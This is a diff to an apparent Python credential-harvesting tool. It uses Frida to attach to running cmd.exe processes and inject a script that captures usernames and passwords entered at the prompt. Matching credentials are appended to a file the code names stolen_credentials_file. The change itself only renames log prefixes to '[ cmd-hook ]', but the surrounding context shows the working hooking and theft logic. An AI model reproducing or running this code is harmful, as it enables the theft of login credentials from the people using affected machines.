@@ -8,9 +8,9 @@ def wait_for():
 
 def hook(pid):
     try:
-        print("[+] Trying To Attach To CMD")
+        print("[ cmd-hook ] Trying To Attach To CMD")
         session = frida.attach(pid)
-        print(f"[+] Attached cmd with pid {pid}!")
+        print(f"[ cmd-hook ] Attached cmd with pid {pid}!")
         script = session.create_script("""
 			var username;
 			var password;
@@ -37,8 +37,8 @@ def hook(pid):
         script.load()
 
     except Exception as e:
-        print("[-] Unhandled exception: " + str(e))
-        print("[-] Continuing...")
+        print("[ cmd-hook ] Unhandled exception: " + str(e))
+        print("[ cmd-hook ] Continuing...")
 
 
 def on_credential_submit_cmd(message, data):
@@ -47,7 +47,7 @@ def on_credential_submit_cmd(message, data):
     credential_dump = message["payload"]
     if any(keyword for keyword in targeted_keywords if keyword in credential_dump):
 
-        print(f"[+] Parsed credentials submitted to cmd prompt:")
+        print("[ cmd-hook ] Parsed credentials submitted to cmd prompt:")
         print(credential_dump)
         with open("credentials.txt", "a") as stolen_credentials_file:
             stolen_credentials_file.write(credential_dump + '\n')
